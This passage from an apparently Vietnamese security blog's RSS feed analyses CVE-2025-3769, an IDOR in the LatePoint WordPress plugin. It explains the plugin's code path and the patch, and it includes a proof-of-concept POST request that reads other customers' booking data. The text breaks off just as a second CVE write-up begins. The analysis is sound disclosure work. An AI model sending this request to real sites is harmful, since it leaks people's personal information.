0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_latepoint_route_call&amp;#39;, array( $this, &amp;#39;route_call&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (k·ªÉ c·∫£ Unauthenticated). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=latepoint_route_call&lt;/code&gt; th√¨ callback &lt;code&gt;route_call&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function route_call() {&#xA;    $route_name = OsRouterHelper::get_request_param( &amp;#39;route_name&amp;#39;, OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39; ) );&#xA;    OsRouterHelper::call_by_route_name( $route_name, OsRouterHelper::get_request_param( &amp;#39;return_format&amp;#39;, &amp;#39;html&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;route_call()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;get_request_param()&lt;/code&gt; v·ªõi 2 tham s·ªë &lt;code&gt;&#39;route_name&#39;&lt;/code&gt; v√† gi√° tr·ªã default &lt;code&gt;OsRouterHelper::build_route_name( &#39;dashboard&#39;, &#39;index&#39; )&lt;/code&gt; n·∫øu param &lt;code&gt;route_name&lt;/code&gt; kh√¥ng t·ªìn t·∫°i trong request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_request_param($name, $default = false){&#xA;    // $name = &amp;#39;route_name&amp;#39;&#xA;    // $default = OsRouterHelper::build_route_name( &amp;#39;dashboard&amp;#39;, &amp;#39;index&amp;#39;&#xA;    if(isset($_GET[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_GET[$name]));&#xA;    }elseif(isset($_POST[$name])){&#xA;      $param = sanitize_text_field(wp_unslash($_POST[$name]));&#xA;    }else{&#xA;    &#x9;$param = $default;&#xA;    }&#xA;    return $param;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function build_route_name($controller, $action){&#xA;    return $controller.&amp;#39;__&amp;#39;.$action;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi c√≥ gi√° tr·ªã c·ªßa &lt;code&gt;$route_name&lt;/code&gt;, h√†m ti·∫øp t·ª•c g·ªçi &lt;code&gt;call_by_route_name&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function call_by_route_name($route_name, $return_format = &amp;#39;html&amp;#39;){&#xA;    OsDebugHelper::log_route($route_name, $return_format);&#xA;    $route_data = self::convert_route_name_to_controller_and_action($route_name);&#xA;    if(!empty($route_data)){&#xA;        $controller_obj = $route_data[&amp;#39;controller&amp;#39;];&#xA;        $action = $route_data[&amp;#39;action&amp;#39;];&#xA;        if($return_format) $controller_obj-&amp;gt;set_return_format($return_format);&#xA;        // check if user is allowed to access this route&#xA;        if($controller_obj-&amp;gt;can_current_user_access_action($action)){&#xA;            $controller_obj-&amp;gt;route_name = $route_name;&#xA;            $controller_obj-&amp;gt;$action();&#xA;        }else{&#xA;            if($controller_obj-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;                $controller_obj-&amp;gt;send_json( [&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;)] );&#xA;            }else{&#xA;                echo &amp;#39;&amp;lt;div class=&amp;#34;latepoint-not-authorized&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;not-authorized-message&amp;#34;&amp;gt;&amp;#39;.esc_html__(&amp;#39;Not Authorized&amp;#39;, &amp;#39;latepoint&amp;#39;).&amp;#39;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;;&#xA;            }&#xA;            exit();&#xA;        }&#xA;    }else{&#xA;        esc_html_e(&amp;#39;Page Not Found&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;call_by_route_name()&lt;/code&gt; s·∫Ω ghi log route, l·∫•y controller v√† action t∆∞∆°ng ·ª©ng v·ªõi route ƒë√≥ g√°n cho &lt;code&gt;$route_data&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function convert_route_name_to_controller_and_action($route_name): array{&#xA;    list($controller_name, $action) = explode(&amp;#39;__&amp;#39;, $route_name);&#xA;    if(empty($controller_name) || empty($action)) return [];&#xA;    $controller_name = str_replace(&amp;#39;_&amp;#39;, &amp;#39;&amp;#39;, ucwords($controller_name, &amp;#39;_&amp;#39;));&#xA;    $controller_class_name = &amp;#39;Os&amp;#39;.$controller_name.&amp;#39;Controller&amp;#39;;&#xA;    if(class_exists($controller_class_name)) {&#xA;        $controller_obj = new $controller_class_name();&#xA;        if(method_exists($controller_obj, $action)) {&#xA;            // check if action is valid&#xA;            return [&amp;#39;controller&amp;#39; =&amp;gt; $controller_obj, &amp;#39;action&amp;#39; =&amp;gt; $action];&#xA;        }else{&#xA;            return [];&#xA;        }&#xA;    }else{&#xA;        return [];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n &lt;code&gt;$route_name&lt;/code&gt; d·∫°ng &lt;code&gt;&#39;controller__action&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;T√°ch chu·ªói theo &lt;code&gt;__&lt;/code&gt; ra &lt;code&gt;$controller_name&lt;/code&gt; v√† &lt;code&gt;$action&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu r·ªóng ‚Üí tr·∫£ v·ªÅ &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Chuy·ªÉn &lt;code&gt;$controller_name&lt;/code&gt; sang PascalCase, b·ªè &lt;code&gt;_&lt;/code&gt;, th√™m prefix &lt;code&gt;Os&lt;/code&gt; v√† suffix &lt;code&gt;Controller&lt;/code&gt; ‚Üí t√™n class.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra class t·ªìn t·∫°i ‚Üí t·∫°o object.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra method t·ªìn t·∫°i trong object ‚Üí tr·∫£ v·ªÅ m·∫£ng &lt;code&gt;[&#39;controller&#39; =&amp;gt; object, &#39;action&#39; =&amp;gt; method]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu class ho·∫∑c method kh√¥ng t·ªìn t·∫°i ‚Üí tr·∫£ v·ªÅ m·∫£ng r·ªóng &lt;code&gt;[]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;call_by_route_name()&lt;/code&gt; ti·∫øp t·ª•c s·∫Ω ki·ªÉm tra &lt;code&gt;$route_data&lt;/code&gt; n·∫øu kh√¥ng r·ªóng th√¨ set format tr·∫£ v·ªÅ, check quy·ªÅn truy c·∫≠p &lt;code&gt;can_current_user_access_action($action)&lt;/code&gt;: N·∫øu user hi·ªán t·∫°i c√≥ th·ªÉ  truy c·∫≠p action n√†y th√¨ g·ªçi method action: &lt;code&gt;$controller_obj-&amp;gt;$action()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c ƒë·ªãnh, khi ng∆∞·ªùi d√πng c√≥ cookie c·ªßa &lt;code&gt;LatePoint&lt;/code&gt; (tr·ªü th√†nh customer) th√¨ ƒë√°p ·ª©ng ƒëi·ªÅu ki·ªán n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#34; title=&#34;Cookie c·ªßa ng∆∞·ªùi d√πng LatePoint&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie c·ªßa ng∆∞·ªùi d√πng LatePoint&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;388&#34; width=&#34;773&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie c·ªßa ng∆∞·ªùi d√πng LatePoint&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ c√≥ ƒë∆∞·ª£c cookie n√†y, ta c·∫ßn ph·∫£i order v√† s·ª≠ d·ª•ng ch·ª©c nƒÉng create account:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#34; title=&#34;T·∫°o account&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/order.png&#34; data-sub-html=&#34;&lt;h2&gt;Account&lt;/h2&gt;&lt;p&gt;T·∫°o account&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/order.png&#39; alt=&#34;Account&#34; height=&#34;899&#34; width=&#34;694&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o account&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Khi th·ª±c hi·ªán diff code, t√¥i th·∫•y m·ªôt s·ªë logic thu·ªôc c√°c h√†m c·ªßa class &lt;code&gt;OsCustomerCabinetController&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c fix b·∫±ng c√°ch ki·ªÉm tra quy·ªÅn s·ªü h·ªØu tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $order-&amp;gt;is_new_record() || ( $order-&amp;gt;customer_id != OsAuthHelper::get_logged_in_customer_id() ) ) {&#xA;    $this-&amp;gt;send_json( array(&#xA;        &amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_ERROR,&#xA;        &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Not Allowed&amp;#39;, &amp;#39;latepoint&amp;#39;)&#xA;    ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#34; title=&#34;M·ªôt s·ªë h√†m ƒë∆∞·ª£c fix&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Fix&lt;/h2&gt;&lt;p&gt;M·ªôt s·ªë h√†m ƒë∆∞·ª£c fix&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/diff.png&#39; alt=&#34;Fix&#34; height=&#34;915&#34; width=&#34;1860&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;M·ªôt s·ªë h√†m ƒë∆∞·ª£c fix&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Kh·ªõp v·ªõi ph√¢n t√≠ch c·ªßa t√¥i ·ªü tr√™n, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Route h·ª£p l·ªá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;route_name=customer_cabinet__view_booking_summary_in_lightbox&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;s·∫Ω ƒë∆∞·ª£c map th√†nh&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;OsCustomerCabinetController::view_booking_summary_in_lightbox()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;view_booking_summary_in_lightbox()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ tr·∫£ v·ªÅ d·ªØ li·ªáu booking.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Create Booking (no login required)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Creates Customer account&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Customer cookie issued (logged-in as customer)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attacker sends request to admin-ajax.php?action=latepoint_route_call&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Router resolves to OsCustomerCabinetController&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;can_current_user_access_action() ‚Üí PASS&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;view_booking_summary_in_lightbox() called&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Booking ID taken from request&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;No ownership validation (&amp;lt;= 5.1.92)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Sensitive booking data leaked (email, name, etc.)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php?t=1766721895425 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; latepoint_cart_86a9106ae65537651a8e456835b316ab=8ffe0e2c-9c69-48f8-94d9-18dd24022f90; latepoint_customer_logged_in_cookie&#xA;&#xA;action=latepoint_route_call&amp;amp;route_name=customer_cabinet__view_booking_summary_in_lightbox&amp;amp;params=booking_id=other_booking_id&amp;amp;return_format=json&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-26-cve-2025-3769/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Resutl&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-26-cve-2025-3769/result.png&#39; alt=&#34;Resutl&#34; height=&#34;653&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE‚Äë2025‚Äë3769 xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu ki·ªÉm tra quy·ªÅn s·ªü h·ªØu d·ªØ li·ªáu trong c√°c action c·ªßa OsCustomerCabinetController. Ng∆∞·ªùi d√πng c√≥ session h·ª£p l·ªá c√≥ th·ªÉ truy c·∫≠p booking c·ªßa ng∆∞·ªùi kh√°c. B·∫£n v√° 5.1.93 ƒë√£ ki·ªÉm tra customer_id tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu, ngƒÉn ch·∫∑n IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication kh√¥ng ƒë·ªìng nghƒ©a v·ªõi Authorization.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n tin t∆∞·ªüng d·ªØ li·ªáu client g·ª≠i l√™n (ID, route, params).&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra ownership ·ªü t·∫ßng business logic.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic routing c·∫ßn ki·ªÉm so√°t ch·∫∑t quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;IDOR x·∫£y ra khi thi·∫øu ki·ªÉm tra m·ªëi quan h·ªá user‚Äìobject.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-92-unauthenticated-insecure-direct-object-reference-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin &amp;lt;= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;  h&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3281 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;User Registration &amp;amp; Membership ‚Äì Custom Registration Form, Login Form, and User Profile&lt;/strong&gt; cho WordPress b·ªã &lt;strong&gt;l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;4.2.1&lt;/strong&gt;, th√¥ng qua h√†m &lt;code&gt;create_stripe_subscription()&lt;/code&gt;, do &lt;strong&gt;thi·∫øu ki·ªÉm tra h·ª£p l·ªá ƒë·ªëi v·ªõi kh√≥a &lt;code&gt;member_id&lt;/code&gt; do ng∆∞·ªùi d√πng ki·ªÉm so√°t&lt;/strong&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;x√≥a t√†i kho·∫£n ng∆∞·ªùi d√πng b·∫•t k·ª≥&lt;/strong&gt; ƒë√£ ƒëƒÉng k√Ω th√¥ng qua plugin n√†y.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: 